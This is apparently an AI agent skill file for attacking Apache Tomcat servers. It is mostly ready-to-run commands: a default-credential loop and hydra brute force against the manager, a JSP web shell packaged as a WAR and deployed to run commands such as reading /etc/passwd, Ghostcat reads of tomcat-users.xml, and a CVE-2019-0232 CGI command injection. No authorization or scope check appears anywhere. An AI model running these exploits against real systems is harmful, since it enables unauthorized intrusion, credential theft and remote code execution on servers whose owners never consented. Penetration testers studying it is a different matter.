---
name: tech-tomcat
description: "Apache Tomcat security testing — manager app default creds, WAR deployment RCE, CVE exploitation (Ghostcat, CVE-2019-0232), AJP connector abuse, session fixation. Triggers: 'tomcat', 'apache tomcat', 'tomcat manager', 'tomcat rce', 'war deployment', 'ghostcat', 'ajp connector', 'tomcat exploit', 'tomcat default creds'."
---

# Apache Tomcat Security Testing

Exploit Tomcat Manager for WAR deployment RCE and configuration issues.

---

## Phase 1: Discovery & Default Credentials

```bash
TARGET="http://TARGET:8080"

# Detect Tomcat:
nmap -p 8080,8443 -sV --script http-headers "$TARGET" 2>/dev/null | grep -i "Apache-Coyote\|Tomcat"
curl -s -I "$TARGET/" | grep -i "apache\|coyote\|tomcat"

# Test default credentials on Manager:
for CRED in "admin:admin" "admin:password" "tomcat:tomcat" "admin:tomcat" "manager:manager" "admin:s3cr3t" "root:root"; do
  USER=$(echo $CRED | cut -d: -f1)
  PASS=$(echo $CRED | cut -d: -f2)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -u "$USER:$PASS" "$TARGET/manager/html")
  [ "$STATUS" == "200" ] && echo "VALID: $USER:$PASS"
done | tee output/tomcat_creds.txt

# Brute force:
hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
  -s 8080 http-get /manager/html "$TARGET" 2>/dev/null
```

---

## Phase 2: WAR Shell Deployment (RCE)

```bash
TARGET="http://TARGET:8080"
USER="tomcat"
PASS="tomcat"

# Create malicious WAR:
mkdir -p /tmp/war/WEB-INF
cat > /tmp/war/shell.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
  BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line; while ((line = reader.readLine()) != null) out.println(line);
}
%>
EOF

cat > /tmp/war/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">
  <display-name>Shell</display-name>
</web-app>
EOF

cd /tmp && jar cvf shell.war -C war . 2>/dev/null

# Deploy WAR:
curl -s -u "$USER:$PASS" -T /tmp/shell.war \
  "$TARGET/manager/text/deploy?path=/shell&update=true" 2>/dev/null

# Execute command:
curl -s "$TARGET/shell/shell.jsp?cmd=id" | tee output/tomcat_rce.txt
curl -s "$TARGET/shell/shell.jsp?cmd=cat%20/etc/passwd" | tee output/tomcat_passwd.txt
```

---

## Phase 3: Ghostcat (CVE-2020-1938)

```bash
TARGET="TARGET_IP"

# AJP port check:
nmap -p 8009 "$TARGET" 2>/dev/null | grep "open"

# Ghostcat exploit (reads arbitrary files via AJP):
python3 /opt/CVE-2020-1938/exploit.py -p 8009 \
  -f /WEB-INF/web.xml "$TARGET" 2>/dev/null | tee output/ghostcat_webxml.txt

# Read credentials from web.xml:
python3 /opt/CVE-2020-1938/exploit.py -p 8009 \
  -f /conf/tomcat-users.xml "$TARGET" 2>/dev/null | tee output/tomcat_users_xml.txt
```

---

## Phase 4: CVE-2019-0232 (CGI RCE on Windows)

```bash
TARGET="http://TARGET:8080"

# Windows-only: CGI path traversal + command injection
curl -s "$TARGET/cgi-bin/.cmd?&dir" 2>/dev/null | tee output/tomcat_cgi.txt

# Exploit:
curl -s "$TARGET/cgi-bin/hello.bat?&dir+C:\\" 2>/dev/null
```

---

## Output

Save to `output/`:
- `tomcat_creds.txt` — valid manager credentials
- `tomcat_rce.txt` — RCE command execution proof
- `ghostcat_webxml.txt` — web.xml contents via Ghostcat

## Next Phase

→ `post-linux-privesc` or `post-windows-privesc` after Tomcat shell
→ `vuln-deserialization` for Java deserialization via Tomcat
